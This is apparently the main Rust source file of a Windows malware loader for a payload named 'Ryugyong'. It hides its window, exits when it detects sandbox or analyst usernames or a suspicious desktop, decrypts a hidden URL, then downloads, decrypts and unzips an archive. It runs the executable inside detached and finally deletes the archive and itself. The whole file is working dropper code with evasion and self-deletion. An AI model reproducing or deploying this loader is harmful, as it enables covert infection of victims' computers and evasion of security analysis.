#![windows_subsystem = "windows"]

mod config;
mod utils;
mod crypto;
mod download;

use std::{env, fs, process};
use std::path::PathBuf;
use std::process::Command;
use std::os::windows::process::CommandExt;

#[tokio::main]
async fn main() {
    check_username();
    check_desktop_files();

    let temp = env::temp_dir();
    let unzip_dir = temp.join(config::RANDOM_STR_1);

    fs::create_dir_all(&unzip_dir)
        .unwrap();

    // This is the path of the zip file, encrypted
    // or decrypted, that Ryugyong and all its
    // libs are in.
    #[allow(unused)]
    let mut ryugyong_file = PathBuf::new();

    if config::FILE_URL.is_empty() {
        let exec = env::current_exe()
            .unwrap();

        let exec_parent = exec
            .parent()
            .unwrap()
            .to_path_buf();

        ryugyong_file = match utils::find_file(&exec_parent, "zip", &[]) {
            Ok(path) => path,
            Err(err) => {
                if config::_DEBUG_MODE {
                    println!("failed to find Ryugyong file in {} - {}", exec_parent.display(), err);
                }

                process::exit(0);
            }
        };
    } else {
        let decrypted_url = match crypto::decrypt_string(config::FILE_URL, config::ENCRYPTION_KEY) {
            Ok(url) => url,
            Err(err) => {
                if config::_DEBUG_MODE {
                    println!("failed to decrypt url - {}", err);
                }

                process::exit(0);
            }
        };

        let out_file = unzip_dir.join(config::RANDOM_STR_1);

        ryugyong_file = match download::download_file(&decrypted_url, &out_file).await {
            Ok(path) => path,
            Err(err) => {
                if config::_DEBUG_MODE {
                    println!("failed to download from {} - {}", decrypted_url, err);
                }

                process::exit(0);
            }
        };
    }

    if config::FILE_ENCRYPTED {
        let decrypted_file = unzip_dir.join(format!("{}.zip", config::RANDOM_STR_2));

        ryugyong_file = match crypto::decrypt_file(&ryugyong_file, &decrypted_file, config::ENCRYPTION_KEY) {
            Ok(path) => path,
            Err(err) => {
                if config::_DEBUG_MODE {
                    println!("failed to decrypt file from \"{}\" to \"{}\" - {}", ryugyong_file.display(), decrypted_file.display(), err);
                }

                process::exit(0);
            }
        };
    }

    let unzipped = match utils::unzip_file(&ryugyong_file, &unzip_dir) {
        Ok(path) => path,
        Err(err) => {
            if config::_DEBUG_MODE {
                println!("failed to unzip from \"{}\" to \"{}\" - {}", ryugyong_file.display(), unzip_dir.display(), err);
            }

            process::exit(0);
        }
    };

    let the_exec = match utils::find_file(&unzipped, "exe", &["createdump"]) {
        Ok(path) => path,
        Err(err) => {
            if config::_DEBUG_MODE {
                println!("failed to find Ryugyong executable in {} - {}", unzipped.display(), err);
            }

            process::exit(0);
        }
    };

    _ = Command::new(&the_exec)
        .creation_flags(0x00000008)
        .spawn()
        .unwrap();

    fs::remove_file(&ryugyong_file)
        .unwrap();

    let this_exec = env::current_exe()
        .unwrap();

    fs::remove_file(&this_exec)
        .unwrap();

    process::exit(0);
}

fn check_username() {
    if !config::CHECK_USERNAME {
        return;
    }

    let username = env::var("USERNAME")
        .unwrap();

    let lesser_username = utils::get_lesser_codes(&username);
    if config::_USERNAMES.contains(&lesser_username.as_ref()) {
        process::exit(0);
    }
}

fn check_desktop_files() {
    if !config::CHECK_DESKTOP_FILES {
        return;
    }

    let userprofile = env::var("USERPROFILE")
        .unwrap();

    let desktop = PathBuf::from(userprofile)
        .join("Desktop");

    let files = fs::read_dir(desktop)
        .unwrap()
        .flatten();

    let mut all_files = 0;
    let mut bad_files = 0;

    for item in files {
        let path = item
            .path();

        if !path.is_file() {
            continue;
        }

        let name = match path.file_stem().and_then(|s| s.to_str()) {
            Some(name) => name,
            None => continue,
        };

        if name.is_empty() {
            continue;
        }

        all_files += 1;

        if name.chars().all(|char| !char.is_lowercase()) {
            bad_files += 1;
        }
    }

    if all_files == 0 {
        return;
    }

    if bad_files as f64 / all_files as f64 > 0.8 {
        process::exit(0);
    }
}